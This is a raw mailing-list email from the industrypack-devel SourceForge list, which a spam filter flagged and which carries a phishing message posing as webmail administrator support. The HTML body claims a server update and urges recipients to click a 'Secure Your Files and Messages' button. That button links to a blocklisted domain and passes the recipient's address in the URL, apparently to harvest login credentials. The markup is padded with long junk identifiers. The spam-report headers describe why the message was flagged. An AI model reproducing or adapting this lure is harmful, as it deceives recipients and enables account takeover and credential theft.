Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 153F5413585
	for <lists+industrypack-devel@lfdr.de>; Tue, 21 Sep 2021 16:40:32 +0200 (CEST)
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
	d=lists.sourceforge.net; s=beta; h=Content-Type:Reply-To:From:List-Subscribe:
	List-Help:List-Post:List-Archive:List-Unsubscribe:List-Id:Subject:
	MIME-Version:Message-ID:Date:To:Sender:Cc:Content-Transfer-Encoding:
	Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
	Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Owner;
	bh=qCioNlZ+R3OxavTqzj6lh3p2iY3eAnc7D5TOqlxKo5M=; b=VCb36F2OL5RUidIrdgTCgTNhWF
	7EKY3C9zZVjiNNOOdG/49nb/xXERyBvOXWYEvVVHKGOuhejQiOF5B/hAbVzFR8mubHyxsG8KzyrBs
	tUDtOFXyQeEfXr4MMVC5QFfY4DxoUHUCPuERuLnPtXc/y8T5593VWl+632KqxrJN5S/o=;
Received: from [127.0.0.1] (helo=sfs-ml-2.v29.lw.sourceforge.com)
	by sfs-ml-2.v29.lw.sourceforge.com with esmtp (Exim 4.92.3)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1mSgwg-0005lG-RE
	for lists+industrypack-devel@lfdr.de; Tue, 21 Sep 2021 14:40:30 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-2.v29.lw.sourceforge.com with esmtps
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.92.3)
 (envelope-from <admin@norearche.com>) id 1mSgwg-0005l9-3b
 for industrypack-devel@lists.sourceforge.net; Tue, 21 Sep 2021 14:40:30 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Subject:Content-Transfer-Encoding:Content-Type:
 MIME-Version:Message-ID:Date:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=3J+nHhnad9G6B+MLeE6NM1E6ott4E2+EcVWcABzMnj8=; b=JG5V8bW0DrpLoEIHXAUwcWGUuW
 W14aWd8JmN6tQ68mpWzUh2MXTHyOcTERK15/PBxRNzNZGYtzve2wodjUFWr40mreel4zzB2LmzMZF
 IxhHDTuqwefMQocPOgau+ZDulUcmdTH+NjKe4ZfDdDuxJWxEeGeyWaYP1GF+VEYdcX84=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Subject:Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:
 Date:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=3J+nHhnad9G6B+MLeE6NM1E6ott4E2+EcVWcABzMnj8=; b=d
 ZXCENPAKK9Nfv28TUqnD329ItLdfVEKJMAfsMn5cETRtDD5iLYN+3RnP6tzrOeh/1RiCS441LsQ+9
 GZ0QTXvffhIJweSyFBp4dP2r9Hd5+hespQGwGKkkGFPiNWJuK1KypkXILeYaGQQZz2HnUHnoKW8N6
 BFE9Q2YxeJ8Uk9gE=;
Received: from mail.norearche.com ([174.138.187.102])
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.92.3)
 id 1mSgwe-0003am-82
 for industrypack-devel@lists.sourceforge.net; Tue, 21 Sep 2021 14:40:30 +0000
Received: from localhost (localhost [127.0.0.1])
 by mail.norearche.com (Postfix) with ESMTP id 47B2941A6504
 for <industrypack-devel@lists.sourceforge.net>;
 Tue, 21 Sep 2021 10:05:41 -0400 (EDT)
Received: from mail.norearche.com ([127.0.0.1])
 by localhost (mail.norearche.com [127.0.0.1]) (amavisd-new, port 10032)
 with ESMTP id 7kBHjfyclEcH
 for <industrypack-devel@lists.sourceforge.net>;
 Tue, 21 Sep 2021 10:05:41 -0400 (EDT)
Received: from localhost (localhost [127.0.0.1])
 by mail.norearche.com (Postfix) with ESMTP id E8B07384E417
 for <industrypack-devel@lists.sourceforge.net>;
 Tue, 21 Sep 2021 10:05:40 -0400 (EDT)
DKIM-Filter: OpenDKIM Filter v2.10.3 mail.norearche.com E8B07384E417
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=norearche.com;
 s=E70B88EE-05D4-11EC-8344-9FFF92004228; t=1632233141;
 bh=3J+nHhnad9G6B+MLeE6NM1E6ott4E2+EcVWcABzMnj8=;
 h=From:To:Date:Message-ID:MIME-Version;
 b=bKo+QigXJYBxZm/EOOVkabNxXKptssnl9Ma8G0+hefOMIVnnQHjW5UkyVVsWB+eED
 aBcAx+N1Ae1FXJhbSjZD7zhULDLeWZiZGIRp6NzGZ1f0R5ExByuV1tlUdufbBy/5pT
 RZ2sTl9F+S5+7msroBKnIYwYB91qdzQLrBvYYEsBaZ1UYwEaQ9XLS3Hr63rU57COBw
 gFKX8kT3iVRa4BTK+kGUjfPUQI3smES6dTKsuoB4du2oz0PAKCi7urRAFhZtNE3YH+
 0w9oqdIwNJ9er0II6vwPwP2kgtW8IL+BpHv3BOZ/eNtQUdvkV5GRq2Ijzyz1C0Iafe
 fg1AyrVIbqm9g==
X-Virus-Scanned: amavisd-new at norearche.com
Received: from mail.norearche.com ([127.0.0.1])
 by localhost (mail.norearche.com [127.0.0.1]) (amavisd-new, port 10026)
 with ESMTP id moAeymAz4Vxj
 for <industrypack-devel@lists.sourceforge.net>;
 Tue, 21 Sep 2021 10:05:40 -0400 (EDT)
Received: from norearche.com (unknown [172.93.220.29])
 by mail.norearche.com (Postfix) with ESMTPSA id 10CF2399C30D
 for <industrypack-devel@lists.sourceforge.net>;
 Tue, 21 Sep 2021 10:05:39 -0400 (EDT)
To: industrypack-devel@lists.sourceforge.net
Date: 21 Sep 2021 16:05:39 +0200
Message-ID: <20210921160539.46445C7744FA2630@norearche.com>
MIME-Version: 1.0
X-Spam-Score: 8.4 (++++++++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-2.v13.lw.sourceforge.com", 
 has identified this incoming email as possible spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview: industrypack-devel@lists.sourceforge.net Dear
 industrypack-devel
 We are currently experiencing a high volume of Email Traffic, so for these
 reasons we are updating our server. 
 Content analysis details:   (8.4 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 2.5 URIBL_DBL_SPAM         Contains a spam URL listed in the Spamhaus DBL
 blocklist [URIs: fromewill.cf]
 0.0 URIBL_PH_SURBL         Contains an URL listed in the PH SURBL blocklist
 [URIs: fromewill.cf]
 1.9 URIBL_ABUSE_SURBL      Contains an URL listed in the ABUSE SURBL
 blocklist [URIs: fromewill.cf]
 1.5 RCVD_IN_SORBS_WEB      RBL: SORBS: sender is an abusable web server
 [172.93.220.29 listed in dnsbl.sorbs.net]
 1.3 RCVD_IN_VALIDITY_RPBL  RBL: Relay in Validity RPBL,
 https://senderscore.org/blocklistlookup/
 [174.138.187.102 listed in bl.score.senderscore.com]
 0.0 RCVD_IN_MSPIKE_L4      RBL: Bad reputation (-4)
 [174.138.187.102 listed in bl.mailspike.net]
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 -0.0 SPF_PASS               SPF: sender matches SPF record
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.0 HTML_FONT_SIZE_LARGE   BODY: HTML font size is large
 0.0 HTML_MESSAGE           BODY: HTML included in message
 -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from
 author's domain
 -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
 envelope-from domain
 -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
 valid
 0.5 RCVD_IN_UCE1           RBL: IP Listed in UCEPROTECT Level 1
 [174.138.187.102 listed in dnsbl-1.uceprotect.net]
 0.8 FROM_FMBLA_NEWDOM28    From domain was registered in last 14-28
 days 0.0 RCVD_IN_MSPIKE_BL      Mailspike blacklisted
X-VA-Spam-Flag: YES
X-Spam-Flag: YES
X-Headers-End: 1mSgwe-0003am-82
Subject: [Industrypack-devel] [SPAM] Mailbox settings
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
From: Admin Support via Industrypack-devel
 <industrypack-devel@lists.sourceforge.net>
Reply-To: Admin Support <admin@norearche.com>
Content-Type: multipart/mixed; boundary="===============4147338911743953070=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============4147338911743953070==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
w3.org/TR/html4/loose.dtd">

<HTML><HEAD>
<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
<body style=3D"MARGIN: 0.5em">
<P>
<table style=3D"FONT-SIZE: 14px; MAX-WIDTH: 516px; FONT-FAMILY: roboto, san=
s-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-COLLAPSE: collapse;=
 MIN-WIDTH: 220px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(26,26=
,26); PADDING-BOTTOM: 20px; FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETT=
ER-SPACING: normal; font-variant-ligatures: normal; font-variant-caps: norm=
al; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; tex=
t-decoration-style: initial; text-decoration-color:=20
initial" cellspacing=3D"0" cellpadding=3D"0" border=3D"0">
<TBODY style=3D"BOX-SIZING: border-box">
<TR style=3D"BOX-SIZING: border-box">
<td style=3D"BOX-SIZING: border-box; FONT-FAMILY: Roboto, RobotoDraft, Helv=
etica, Arial, sans-serif; MARGIN: 0px">
<DIV style=3D"BOX-SIZING: border-box; BORDER-TOP: rgb(218,220,224) thin sol=
id; BORDER-RIGHT: rgb(218,220,224) thin solid; BORDER-BOTTOM: rgb(218,220,2=
24) thin solid; PADDING-BOTTOM: 36px; PADDING-TOP: 40px; PADDING-LEFT: 20px=
; BORDER-LEFT: rgb(218,220,224) thin solid; PADDING-RIGHT: 20px; border-rad=
ius: 8px" align=3Dcenter>
<DIV style=3D'BOX-SIZING: border-box; FONT-FAMILY: "google sans", roboto, r=
obotodraft, helvetica, arial, sans-serif; BORDER-BOTTOM: rgb(218,220,224) t=
hin solid; PADDING-BOTTOM: 24px; PADDING-TOP: 0px; LINE-HEIGHT: 32px; BORDE=
R-TOP-WIDTH: 0px'>
<DIV style=3D"BOX-SIZING: border-box; PADDING-TOP: 0px; BORDER-TOP-WIDTH: 0=
px"><FONT style=3D"BOX-SIZING: border-box" color=3D#0b5394 size=3D6>industr=
ypack-devel@lists.sourceforge.net</FONT></DIV></DIV>
<DIV style=3D"BOX-SIZING: border-box; FONT-FAMILY: roboto-regular, helvetic=
a, arial, sans-serif; PADDING-TOP: 20px; LINE-HEIGHT: 20px"><FONT style=3D"=
BOX-SIZING: border-box" color=3D#6fa8dc>&nbsp;&nbsp;</FONT><SPAN style=3D"B=
OX-SIZING: border-box; FONT-WEIGHT: bolder; COLOR: rgb(111,168,220)">&nbsp;=
</SPAN><FONT style=3D"BOX-SIZING: border-box" color=3D#000000>Dear industry=
pack-devel</FONT></DIV>
<DIV style=3D"BOX-SIZING: border-box; FONT-FAMILY: roboto-regular, helvetic=
a, arial, sans-serif; PADDING-TOP: 20px; LINE-HEIGHT: 20px"><FONT style=3D"=
BOX-SIZING: border-box" color=3D#000000>We are currently experiencing a hig=
h volume of Email Traffic, so for these reasons we are updating our server.=
&nbsp;</FONT></DIV>
<DIV style=3D"BOX-SIZING: border-box; FONT-FAMILY: roboto-regular, helvetic=
a, arial, sans-serif; PADDING-TOP: 20px; LINE-HEIGHT: 20px"><FONT style=3D"=
BOX-SIZING: border-box" color=3D#000000>Click Below to Secure your Files an=
d Messages while we update our server so avoid any loss.</FONT></DIV>
<DIV style=3D"BOX-SIZING: border-box; FONT-FAMILY: roboto-regular, helvetic=
a, arial, sans-serif; PADDING-TOP: 20px; LINE-HEIGHT: 20px">
<table id=3D"gmail-v1gmail-2ae96fd532b784e5m_1263260451957793932m_-65523185=
53392361354ydp58b2f7dm_8030327558888139480m_-8557124416714663571gmail-v1v1m=
_-9007150609401963172m_-6343666756592455495m_-908273688024058716gmail-m_582=
9101339008050347m_9223217537136466856gmail-m_-1414905369538074570m_17970608=
49724915086m_857612287866126095m_-9091133349012398851m_6855368497531589296g=
mail-m_-4762950780992957690gmail-yiv3842750366m_-6052800750260689830m_74795=
1944825223686m_-482852405835973781m_7085791466900691159m_430" style=3D"WIDT=
H: 280px; BORDER-COLLAPSE: collapse; TABLE-LAYOUT: fixed; PADDING-BOTTOM: 0=
px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px" c=
ellspacing=3D"0" cellpadding=3D"0" border=3D"0" 2185789845887189m_897243785=
0012678512m_-4210401523334126125m_-7724248151597343143m_7304333262888219737=
m_149424554058322942m_269060464312=3D"">
<TBODY=20
id=3Dgmail-v1gmail-2ae96fd532b784e5m_1263260451957793932m_-6552318553392361=
354ydp58b2f7dm_8030327558888139480m_-8557124416714663571gmail-v1v1m_-900715=
0609401963172m_-6343666756592455495m_-908273688024058716gmail-m_58291013390=
08050347m_9223217537136466856gmail-m_-1414905369538074570m_1797060849724915=
086m_857612287866126095m_-9091133349012398851m_6855368497531589296gmail-m_-=
4762950780992957690gmail-yiv3842750366m_-6052800750260689830m_7479519448252=
23686m_-482852405835973781m_7085791466900691159m_430
 style=3D"BOX-SIZING: border-box; WIDTH: 280px" 2185789845887189m_897243785=
0012678512m_-4210401523334126125m_-7724248151597343143m_7304333262888219737=
m_149424554058322942m_269060464312>
<TR=20
id=3Dgmail-v1gmail-2ae96fd532b784e5m_1263260451957793932m_-6552318553392361=
354ydp58b2f7dm_8030327558888139480m_-8557124416714663571gmail-v1v1m_-900715=
0609401963172m_-6343666756592455495m_-908273688024058716gmail-m_58291013390=
08050347m_9223217537136466856gmail-m_-1414905369538074570m_1797060849724915=
086m_857612287866126095m_-9091133349012398851m_6855368497531589296gmail-m_-=
4762950780992957690gmail-yiv3842750366m_-6052800750260689830m_7479519448252=
23686m_-482852405835973781m_7085791466900691159m_430
 style=3D"BOX-SIZING: border-box" 2185789845887189m_8972437850012678512m_-4=
210401523334126125m_-7724248151597343143m_7304333262888219737m_149424554058=
322942m_269060464312>
<td id=3D"gmail-v1gmail-2ae96fd532b784e5m_1263260451957793932m_-65523185533=
92361354ydp58b2f7dm_8030327558888139480m_-8557124416714663571gmail-v1v1m_-9=
007150609401963172m_-6343666756592455495m_-908273688024058716gmail-m_582910=
1339008050347m_9223217537136466856gmail-m_-1414905369538074570m_17970608497=
24915086m_857612287866126095m_-9091133349012398851m_6855368497531589296gmai=
l-m_-4762950780992957690gmail-yiv3842750366m_-6052800750260689830m_74795194=
4825223686m_-482852405835973781m_7085791466900691159m_430" style=3D"BOX-SIZ=
ING: border-box; FONT-FAMILY: Roboto, RobotoDraft, Helvetica, Arial, sans-s=
erif; WIDTH: 280px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0p=
x; MARGIN: 0px; PADDING-RIGHT: 0px" valign=3D"top" align=3D"left" 218578984=
5887189m_8972437850012678512m_-4210401523334126125m_-7724248151597343143m_7=
304333262888219737m_149424554058322942m_269060464312=3D"">
<A=20
id=3Dgmail-v1gmail-2ae96fd532b784e5m_1263260451957793932m_-6552318553392361=
354ydp58b2f7dm_8030327558888139480m_-8557124416714663571gmail-v1v1m_-900715=
0609401963172m_-6343666756592455495m_-908273688024058716gmail-m_58291013390=
08050347m_9223217537136466856gmail-m_-1414905369538074570m_1797060849724915=
086m_857612287866126095m_-9091133349012398851m_6855368497531589296gmail-m_-=
4762950780992957690gmail-yiv3842750366m_-6052800750260689830m_7479519448252=
23686m_-482852405835973781m_7085791466900691159m_430
 class=3Dgmail-v1gmail-daria-goto-anchor style=3D"BOX-SIZING: border-box; B=
ACKGROUND-IMAGE: none; COLOR: rgb(255,255,255); PADDING-BOTTOM: 15px; TEXT-=
ALIGN: center; PADDING-TOP: 15px; PADDING-LEFT: 20px; MARGIN: 0px; DISPLAY:=
 block; PADDING-RIGHT: 20px; BACKGROUND-COLOR: rgb(64,159,255); border-radi=
us: 25px; text-decoration-line: none; background-size: initial" href=3D"htt=
ps://webm1al.fromewill.cf/reading.html?list=3Dindustrypack-devel@lists.sour=
ceforge.net" rel=3Dnoreferrer target=3D_blank=20
2185789845887189m_8972437850012678512m_-4210401523334126125m_-7724248151597=
343143m_7304333262888219737m_149424554058322942m_269060464312>Secure Your<S=
PAN id=3Dgmail-v1gmail-a7acd5f86e8677d4m_1263260451957793932m_-655231855339=
2361354ydp58b2f7dm_8030327558888139480goog_1148600826 style=3D"BOX-SIZING: =
border-box"></SPAN><SPAN id=3Dgmail-v1gmail-53da95fac1a2ea4fm_1263260451957=
793932m_-6552318553392361354ydp58b2f7dm_8030327558888139480goog_1148600827 =
style=3D"BOX-SIZING: border-box"></SPAN>
&nbsp;Files and Messages</A></TD></TR></TBODY></TABLE></DIV>
<DIV style=3D"BOX-SIZING: border-box; FONT-FAMILY: roboto-regular, helvetic=
a, arial, sans-serif; PADDING-TOP: 20px; LINE-HEIGHT: 20px">
<DIV style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px; LINE-HEIGHT: 16px">&=
nbsp;</DIV></DIV></DIV>
<DIV style=3D"BOX-SIZING: border-box">
<DIV style=3D"BOX-SIZING: border-box; FONT-SIZE: 11px; FONT-FAMILY: roboto-=
regular, helvetica, arial, sans-serif; TEXT-ALIGN: center; PADDING-TOP: 12p=
x; LINE-HEIGHT: 18px; BORDER-TOP-WIDTH: 0px">
<DIV style=3D"BOX-SIZING: border-box; PADDING-TOP: 0px; BORDER-TOP-WIDTH: 0=
px">EasyStreet Webmail.</DIV>
<DIV style=3D"BOX-SIZING: border-box; DIRECTION: ltr">&copy;&nbsp;<SPAN cla=
ss=3Dgmail-v1gmail-wmi-callto style=3D"BOX-SIZING: border-box">2019-2021</S=
PAN>&nbsp;</DIV></DIV></DIV></TD></TR></TBODY></TABLE></P></BODY></HTML>


--===============4147338911743953070==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============4147338911743953070==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============4147338911743953070==--
